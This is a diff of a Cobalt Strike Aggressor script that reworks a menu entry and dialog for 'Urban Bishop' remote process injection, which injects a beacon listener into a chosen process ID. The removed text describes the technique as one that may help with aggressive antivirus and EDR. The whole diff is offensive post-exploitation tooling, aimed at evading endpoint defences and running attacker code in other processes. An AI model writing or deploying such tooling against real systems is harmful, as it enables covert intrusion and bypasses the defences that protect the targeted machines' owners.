@@ -53,29 +53,20 @@ item "RemoteProcessInjection - Mr-Un1k0d3r - x64"{
       }
       
   }
-  
-  item "Inject Urban Bishop by Sk3w"{
+ 
+
+    } #End Menu
+ 
+    
+item "Urban Bishop Injection by Sk3w" {
 
     local('$bid');
         foreach $bid ($1){
             urbanbishopinjection($bid);
       }
-}
-
-
-
-
-    } #End Menu
-
-
-#################################
-#
-#
-# Sk3w's Urban Bishop Injection 
-#
-#################################    
+      
+  }
     
-}    
     ###################################		         		###################################
 #######################################		         		#######################################
   #####################################		         		#####################################
@@ -179,19 +170,17 @@ beacon_command_register(
     "Usage: inject-ub [pid] [listener]");
     
     
-    sub urbanbishopinjection{
+    
+sub urbanbishopinjection{
     $bid = $1;
-    $dialog = dialog("Urban Bishop Process Injection", %(processid => "", listener => "", execmethod => "fireAlias"), lambda({
-        $cmdargs = "";
-		$cmdargs = "$3['processid'] $3['listener']";
-        if ($3["execmethod"] eq "fireAlias"){
-            btask($bid, 'Injecting Urban Bishop');
-            bfireAlias($bid, inject-ub, $cmdargs);
-        }
+    $dialog = dialog("Code Injection With Urban Bishop", %(pid => "", listener => "",), lambda({
+		btask($bid, join(' ', @("Injecting into", $3["pid"], "with listener", $3["listener"])));
+		fireAlias($bid, "inject-ub", $3['pid'], $3['listener']);
+   
     }));
-    dialog_description($dialog, "This is a process injection technique that may help with aggressive AV and EDR");
-    drow_text($dialog, "processid",  "Process ID to inject into");
-    drow_text($dialog, "filteruser",  "Listener Name");
-    dbutton_action($dialog, "Run");
-	dialog_show($dialog);
+    dialog_description($dialog, "Inject into Remote Process with Urban Bishop");
+    drow_text($dialog, "pid",  "Process ID to inject into");
+    drow_listener_stage($dialog, "listener",  "Listener to Spawn");
+    dbutton_action($dialog, "Execute");
+    dialog_show($dialog);
 }
